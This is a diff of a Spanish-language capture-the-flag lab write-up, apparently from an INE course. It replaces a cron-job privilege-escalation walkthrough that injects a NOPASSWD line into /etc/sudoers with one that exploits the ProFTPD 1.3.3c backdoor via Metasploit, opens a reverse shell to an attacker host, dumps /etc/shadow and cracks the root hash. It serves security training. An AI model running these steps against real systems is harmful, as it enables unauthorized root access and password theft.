@@ -1,227 +1,154 @@
-# ⏰ Linux: Escalada de Privilegios mediante Tareas Cron (Cron Jobs Gone Wild II)
+# 🔐 Linux: Volcado y Descifrado de Contraseñas (Hashdump + Crack)
 
 ## 🎯 Objetivo
 
-Identificar una tarea programada (cron) mal configurada en un sistema Linux que ejecuta un script escribible por un usuario sin privilegios. Modificar dicho script para que añada una entrada en `/etc/sudoers` que permita al usuario `student` ejecutar cualquier comando como `root` sin contraseña. Escalar a superusuario y capturar la bandera.
+Aprovechar el acceso **root** obtenido en un servidor Linux mediante la explotación de ProFTPD 1.3.3c (u otro método) para volcar los hashes de las cuentas del sistema desde `/etc/shadow` y, posteriormente, descifrar la contraseña del superusuario con los módulos de Metasploit. La bandera del laboratorio es la propia contraseña en texto claro.
 
 ---
 
-## 🔍 1. Enumeración inicial
+## 🔍 1. Enumeración y acceso inicial
 
-### 📡 Verificar la conectividad
+### 📡 Verificar conectividad
 
 ```bash
-ping -c4 target.ine.local
+ping -c 4 demo.ine.local
+```
+
+### 🔎 Escaneo de servicios
+
+```bash
+nmap -sS -sV demo.ine.local
+```
+
+**Salida esperada (fragmento relevante):**
+```
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     ProFTPD 1.3.3c
+```
+Se identifica **ProFTPD 1.3.3c**, una versión con puerta trasera.
+
+### 🧪 Confirmación de la vulnerabilidad
+
+```bash
+nmap --script vuln -p 21 demo.ine.local
+```
+
+**Resultado:**
+```
+PORT   STATE SERVICE
+21/tcp open  ftp
+| vuln:
+|   proftpd-backdoor:
+|     VULNERABLE:
+|     ProFTPD 1.3.3c Backdoor
+|     State: VULNERABLE
+```
+✅ La puerta trasera está presente.
+
+---
+
+## 🚀 2. Explotación de la puerta trasera de ProFTPD
+
+### 🗄️ Iniciar la base de datos de Metasploit
+
+```bash
+/etc/init.d/postgresql start
+```
+
+### 🖥️ Cargar el módulo y configurar
+
+```bash
+msfconsole -q
+use exploit/unix/ftp/proftpd_133c_backdoor
+set payload cmd/unix/reverse
+set RHOSTS demo.ine.local
+set LHOST 192.70.114.2
+```
+
+| Opción     | Valor               | Descripción |
+|------------|---------------------|-------------|
+| `payload`  | `cmd/unix/reverse`  | Shell reversa Unix genérica |
+| `RHOSTS`   | IP del objetivo     | demo.ine.local |
+| `LHOST`    | IP de Kali          | 192.70.114.2 (ajustar según la máquina) |
+
+### 💣 Ejecutar y obtener shell
+
+```bash
+exploit -z
 ```
 
 **Salida esperada:**
 ```
-64 bytes from target.ine.local: icmp_seq=1 ttl=64 time=0.350 ms
-...
+[*] Started reverse double handler on 192.70.114.2:4444
+[*] Sending backdoor command...
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command shell session 1 opened (192.70.114.2:4444 -> 192.70.114.3:6200)
 ```
-El objetivo responde.
-
-### 🌐 Acceder al servicio expuesto
-
-Abrir un navegador y visitar la URL:
-
-```
-http://target.ine.local:8000
-```
-
-Se muestra una interfaz de terminal Linux basada en web, que ejecuta los comandos como el usuario **student**. Este será el entorno de trabajo.
+Se obtiene una shell como **root** (UID 0).
 
 ---
 
-## 🧪 2. Análisis del comportamiento sospechoso
+## 🗄️ 3. Volcado de los hashes del sistema
 
-### 📂 Revisar el directorio personal del usuario
-
-```bash
-ls -l
-```
-
-Se observa un archivo llamado `message`:
-
-```
--rw-r--r-- 1 root root 0 Jan 01 12:00 message
-```
-
-El archivo pertenece a **root** y el usuario `student` no puede leerlo ni modificarlo.
-
-### 🔎 Buscar si existe otro archivo con el mismo nombre en el sistema
+Con la sesión en segundo plano, se ejecuta el módulo de post‑explotación `hashdump` para extraer el contenido de `/etc/shadow`.
 
 ```bash
-find / -name message 2>/dev/null
+use post/linux/gather/hashdump
+set SESSION 1
+exploit
 ```
-
-**Salida esperada:**
-```
-/home/student/message
-/tmp/message
-```
-
-El archivo `/tmp/message` es una copia exacta que aparece y se sobrescribe periódicamente.
-
-### ⏱️ Comprobar la periodicidad
-
-```bash
-ls -l /tmp/message
-```
-
-Se observa que la fecha de modificación cambia cada **minuto**. Esto sugiere la existencia de una tarea cron que copia el archivo desde el directorio del estudiante hacia `/tmp`.
-
----
-
-## 🔍 3. Localización del script de la tarea cron
-
-Se busca un script o binario que contenga la cadena `/tmp/message` en el sistema.
-
-```bash
-grep -nri "/tmp/message" /usr 2>/dev/null
-```
-
-| Opción | Descripción |
-|--------|-------------|
-| `-n`   | Muestra el número de línea |
-| `-r`   | Busca recursivamente en subdirectorios |
-| `-i`   | Ignora mayúsculas/minúsculas |
 
 **Resultado esperado:**
 ```
-/usr/local/share/copy.sh:3:cp /home/student/message /tmp/message
+[+] root:$6$xxxx$yyyy...:0:0:root:/root:/bin/bash
+[+] daemon:$6$...:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+[+] ...
 ```
-
-Se encuentra el script **`/usr/local/share/copy.sh`**, responsable de la copia.
-
-### 🔐 Verificar los permisos del script
-
-```bash
-ls -l /usr/local/share/copy.sh
-```
-
-**Salida esperada:**
-```
--rwxrwxrwx 1 root root 50 Jan 01 12:00 /usr/local/share/copy.sh
-```
-
-El script es **escribible por todos los usuarios** (permisos `777`), incluido `student`. Dado que es ejecutado por una tarea cron que corre con privilegios de **root**, cualquier modificación se ejecutará con los máximos privilegios.
-
-### 📄 Contenido original del script
-
-```bash
-cat /usr/local/share/copy.sh
-```
-
-```
-#!/bin/bash
-cp /home/student/message /tmp/message
-```
+Los hashes comienzan por `$6$`, indicando que son **SHA‑512**.
 
 ---
 
-## 🛠️ 4. Modificación del script para escalar privilegios
+## 🔓 4. Descifrado de la contraseña de root
 
-Como el sistema carece de editores de texto (`vim`, `vi`, `nano` no están disponibles), se utiliza **`printf`** para reescribir el contenido del archivo.
-
-```bash
-printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
-```
-
-| Elemento | Significado |
-|----------|-------------|
-| `#! /bin/bash` | Shebang para el intérprete |
-| `\n`       | Salto de línea |
-| `echo "student ALL=NOPASSWD:ALL" >> /etc/sudoers` | Añade al usuario `student` a la lista de sudoers sin contraseña |
-
-Después de la escritura, se verifica el nuevo contenido:
+Metasploit dispone de un módulo auxiliar específico para romper hashes de Linux.
 
 ```bash
-cat /usr/local/share/copy.sh
+use auxiliary/analyze/crack_linux
+set SHA512 true
+run
 ```
 
-**Salida esperada:**
+| Opción    | Valor   | Significado |
+|-----------|---------|-------------|
+| `SHA512`  | `true`  | Indica que el hash a romper es SHA‑512 |
+
+El módulo utiliza diccionarios internos y, si la contraseña es débil, la muestra en pantalla.
+
+**Salida final:**
 ```
-#!/bin/bash
-echo "student ALL=NOPASSWD:ALL" >> /etc/sudoers
+[+] root:password
 ```
+
+🔑 La contraseña de root en texto claro es **`password`**.
 
 ---
 
-## ⏳ 5. Esperar la ejecución del cron
+## 🏁 5. Bandera del laboratorio
 
-La tarea cron se ejecuta **cada minuto**. Se debe esperar ese lapso para que el script modificado sea lanzado por root y añada la entrada en `/etc/sudoers`.
+La bandera **es la misma contraseña descubierta**.
 
-### 🔍 Verificar la configuración de sudo antes de la modificación
-
-```bash
-sudo -l
-```
-
-**Respuesta típica antes de la escalada:**
-```
-Sorry, user student may not run sudo on target.
-```
-
-### 🔁 Tras un minuto, comprobar de nuevo
-
-```bash
-sudo -l
-```
-
-**Respuesta después de la escalada:**
-```
-User student may run the following commands on target:
-    (ALL) NOPASSWD: ALL
-```
-
-✅ El usuario `student` ahora puede ejecutar cualquier comando como `root` sin proporcionar contraseña.
-
----
-
-## 🚀 6. Escalar a root y capturar la bandera
-
-```bash
-sudo su
-```
-
-**Salida:**
-```
-root@target:/home/student#
-```
-
-El prompt cambia a `root`. Ahora se navega al directorio `/root` y se lee la bandera.
-
-```bash
-cd /root
-ls -l
-```
-
-**Salida esperada:**
-```
-total 4
--rw-r--r-- 1 root root 32 Jan 01 12:00 flag
-```
-
-```bash
-cat flag
-```
-
-**Bandera obtenida:**  
-`697914df7a07bb9b718c8ed258150164`
+**Flag:** `password`
 
 ---
 
 ## 🧠 Resumen del ataque
 
-| Fase | Comando / Técnica | Propósito |
-|------|-------------------|-----------|
-| Enumeración | `find / -name message` | Detectar la copia automática del archivo |
-| Búsqueda | `grep -nri "/tmp/message" /usr` | Localizar el script de la tarea cron |
-| Evaluación de permisos | `ls -l /usr/local/share/copy.sh` | Confirmar que es escribible por cualquier usuario |
-| Explotación | `printf ... > /usr/local/share/copy.sh` | Reescribir el script para añadir privilegios sudo |
-| Paciencia | Esperar 1 minuto | Permitir que cron ejecute el script modificado |
-| Escalada | `sudo su` | Convertirse en root |
-| Captura | `cat /root/flag` | Leer la bandera |
+| Fase | Módulo / Comando | Propósito |
+|------|------------------|-----------|
+| 1 | `nmap --script vuln -p 21` | Confirmar ProFTPD 1.3.3c vulnerable |
+| 2 | `exploit/unix/ftp/proftpd_133c_backdoor` | Obtener shell como root |
+| 3 | `post/linux/gather/hashdump` | Extraer los hashes desde `/etc/shadow` |
+| 4 | `auxiliary/analyze/crack_linux` (SHA512=true) | Romper el hash y revelar la contraseña |
 
-Las tareas cron que ejecutan scripts con permisos de escritura excesivos representan un vector clásico de escalada de privilegios en Linux. La falta de editores de texto se puede suplir con comandos como `echo`, `printf` o redirecciones simples.
+El laboratorio demuestra que, una vez obtenido acceso root, la información sensible como las contraseñas de los usuarios puede ser extraída y, si no son robustas, descifrada en segundos con herramientas automatizadas.
